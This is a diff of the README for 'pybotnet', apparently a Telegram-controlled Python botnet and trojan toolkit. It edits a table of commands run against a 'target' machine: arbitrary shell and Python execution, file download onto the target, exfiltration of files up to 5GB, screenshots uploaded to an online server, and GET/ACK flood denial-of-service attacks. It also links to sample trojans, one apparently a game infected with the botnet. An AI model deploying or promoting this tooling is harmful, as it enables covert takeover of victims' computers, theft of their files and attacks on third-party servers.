@@ -66,12 +66,11 @@ ADMIN_CHAT_ID = '12345678910'
 
 
 
-# * is_sheel:          if you compile code without shell: is_sheel=False
 # * show_log:          just for debugging
 # * send_system_data:  send system short info in every bot messages in telegram
 
 bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID,
-                        show_log=True, send_system_data=True, is_shell=True)
+                        show_log=True, send_system_data=True)
 
 delay = 10
 
@@ -93,7 +92,7 @@ COMMAND | Sample | DO THIS | version | tested on |
 --------|--------|---------|--------------------------|-----------|
 `get_info` | `get_info` |return system info | 0.06 | windows, linux |
 `do_sleep <scconds> <message (Optional)>` | `do_sleep 99999 hi, i see you!` | \<if message != none : print(message) > ; time.sleep(seccond) | 0.08 | windows, linux |
-`cmd <system command>` | `cmd mkdir new_folder` `cmd cd ..`, `cmd ls` | run system command in shell or cmd (Be careful not to give endless commands like `ping google.com -t`  in windows or `ping google.com` in linux)  TODO:add timeout| 0.07 | windows, linux|
+`cmd <system command>` | `cmd mkdir new_folder` `cmd cd ..`, `cmd ls` | run system command in shell or cmd (Be careful not to give endless commands like `ping google.com -t`  in windows or `ping google.com` in linux) | 0.07 | windows, linux|
 `export_file <link>` | `export_file https://github.com/onionj/pybotnet/archive/refs/heads/master.zip` | target donwload this file and save to script path | 0.14 | windows, linux|
 `import_file <file_route>` |`import_file /home/onionj/folder/somting.png` | get a file from target system (limit:5GB & 20min)| 0.17.0 |  windows, linux|
 `screenshot` | `screenshot` | Takes a screenshot, uploads it to the online server and return the download link | 0.18.1 |  windows, linux |
@@ -105,12 +104,14 @@ COMMAND | Sample | DO THIS | version | tested on |
 `playsound` | `playsound <sound-name>` | Will play a sound . Playsound can only play MP3 or WAV Files. | 0.25.3 | windows, linux
 `openurl` | `openurl <url> <how-many-times>` | Will open a url n times. | 0.25.3 | windows, linux
 `dos` | `dos <attack-type [GETFlood-ACKFlood]> <target-ip> <target-port> <thread-number> <payload-size>` | Will run Denial-Of-Service Attack. | 1.0.0 | windows
-`runcode` | `runcode <code>` | Will run python code, The code should be written in a seperate line with correct python syntax, Because of python limitations , The function can't return the results. | 1.0.1 | windows
+`runcode` | `runcode <code>` | Will run python code, The code should be written in a seperate line with correct python syntax, Because of python limitations , The function can't return the results. | 1.0.0 | windows
 > If you like this repo and find it useful, please consider ★ starring it (on top right of the page) and forking it :)
 
 > [TODO List](https://github.com/onionj/pybotnet/blob/master/TODOLIST.MD)
 
 > Sample GUI Trojan created by pybotnet: [VINET](https://github.com/onionj/vinet)
+
+> Sample GUI Trojan created by pybotnet: [VINET](https://github.com/SepehrRasouli/GameInfectedWithPyBotNet)
 
 
 ## Contributors ✨
